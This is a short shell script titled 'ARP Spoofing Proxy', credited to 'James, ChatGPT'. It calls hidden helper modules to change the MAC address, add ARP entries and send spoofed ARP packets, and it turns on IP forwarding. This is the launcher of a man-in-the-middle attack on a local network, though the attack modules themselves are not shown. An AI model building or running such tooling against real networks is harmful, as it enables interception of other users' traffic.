#!/bin/sh

#ARP Spoofing Proxy
#Contributors: James, ChatGPT

script_dir="$(dirname "$(readlink -f "$0")")"

cd "$script_dir"
bash "./.Modules/.Mac Changer.sh"
bash "./.Modules/.ARP Adder.sh"
sysctl net.ipv4.ip_forward=1
python "./.Modules/.ARP Sender.py"
